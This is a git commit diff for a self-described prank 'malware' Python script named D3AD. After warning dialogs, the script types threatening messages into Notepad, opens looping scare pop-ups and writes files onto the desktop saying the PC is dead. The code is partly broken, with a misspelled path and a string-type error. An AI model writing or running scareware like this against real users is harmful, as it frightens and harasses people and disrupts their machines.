a9444d4cd68c025ba289ed6a1810672198ba03ad
MF366-Coding <mateus366@vivaldi.net>
2023-03-08 18:13:39 +0000

    Fix some stuff

--- 03_d3ad/03_d3ad.py
+++ 03_d3ad/03_d3ad.py
@@ -12,17 +12,16 @@ elif sys.platform == "win32":
 
 def creepyFiles():
     global pathToWrite
-    pathToWrite = (os.path.expanduser('~/Desktop'))
-    print(pathToWrite)
+    pathToWrite = (os.path.expanduser('~'))
+    pathToWriteActual = str(pathToWrite+r'\Destkop')
     for i in range(100):
         numberFile = 0
-        totalFile = str(pathToWrite+char+"file"+numberFile+".txt")
+        totalFile = str(pathToWriteActual+char+"file"+numberFile+".txt")
         with open(totalFile, 'w', encoding='utf-8') as fileToWrite:
             fileToWrite.write("D3AD\nYour PC is dead!...\n\n\n\njust like you...\ndiiiiiieeeeeeeeeeeeee!!!!!!!!\nYou are d3ad\n")
         numberFile += 1
 
 def scaryPopUps():
-    creepyFiles()
     x = True
     while x:
     	deadPop = mb.askyesno("D3AD", "If you buy a new PC, I will find it and kill it as well...")
@@ -34,7 +33,6 @@ def notepadEdit():
     pyautogui.typewrite('notepad')
     pyautogui.typewrite("I know your IP Adress.\nI'll send someone to you house to kill you...\nNah jk jk...\nI don't know your IP Adress...\nBut I know you computer is now d3ad!!!\nBy: MF366-Coding (I am on GitHub).\nI am not responsible fr anything because I warned you that this would happen...")
     pyautogui.hotkey('win', 'm')
-    scaryPopUps()
 
 if __name__ == '__main__':
     firstWarn = mb.askyesno("! SECURITY WARNING !!", "This app is malware.\nRun on Virtual Environment ONLY!\nBye clicking 'Yes' you agree that the creator is not responsible for any damage at all.\nBy: MF366-Coding (I'm on GitHub)")
@@ -42,6 +40,8 @@ if __name__ == '__main__':
         lastWarn = mb.askyesno("!!! LAST WARNING !!!", "I am not responsible for ANY damage at all.\nPlease consider that.\nStill want to run?")
         if lastWarn:
             notepadEdit()
+            scaryPopUps()
+            creepyFiles()
         else:
             quit()
     else:
